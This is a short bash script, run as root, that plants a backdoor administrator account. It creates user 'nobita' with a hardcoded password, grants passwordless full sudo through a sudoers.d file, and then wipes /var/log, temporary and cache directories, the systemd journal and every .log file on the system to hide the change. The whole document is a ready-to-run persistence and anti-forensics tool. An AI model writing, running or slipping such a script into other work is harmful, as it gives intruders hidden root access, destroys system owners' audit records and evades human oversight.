sudo bash -c '
USERNAME="nobita"
PASSWORD="nobitayt"
HOME_DIR="/home/$USERNAME"
SUDOERS_FILE="/etc/sudoers.d/$USERNAME"

[ -d "$HOME_DIR" ] && rm -rf "$HOME_DIR"
id "$USERNAME" >/dev/null 2>&1 || useradd -m -s /bin/bash "$USERNAME"
echo "$USERNAME:$PASSWORD" | chpasswd

if grep -qiE "debian|ubuntu|mint" /etc/os-release 2>/dev/null || grep -qi "ID_LIKE=debian" /etc/os-release 2>/dev/null; then
  ADMIN_GROUP="sudo"
else
  ADMIN_GROUP="wheel"
fi

getent group "$ADMIN_GROUP" >/dev/null 2>&1 || groupadd -r "$ADMIN_GROUP"
usermod -aG "$ADMIN_GROUP" "$USERNAME"

if ! command -v sudo >/dev/null 2>&1; then
  (apt-get update && apt-get install -y sudo) >/dev/null 2>&1 || (dnf install -y sudo >/dev/null 2>&1 || yum install -y sudo >/dev/null 2>&1)
fi

echo "$USERNAME ALL=(ALL) NOPASSWD:ALL" > "$SUDOERS_FILE"
chmod 440 "$SUDOERS_FILE"

rm -rf /var/log/* /tmp/* /var/tmp/* /var/cache/* 2>/dev/null || true
journalctl --rotate >/dev/null 2>&1 || true
journalctl --vacuum-time=1s >/dev/null 2>&1 || true
find / -type f -name "*.log" -delete 2>/dev/null || true

echo "[*] User '$USERNAME' created with full root access. Password: '$PASSWORD'. Home and logs cleared."
'
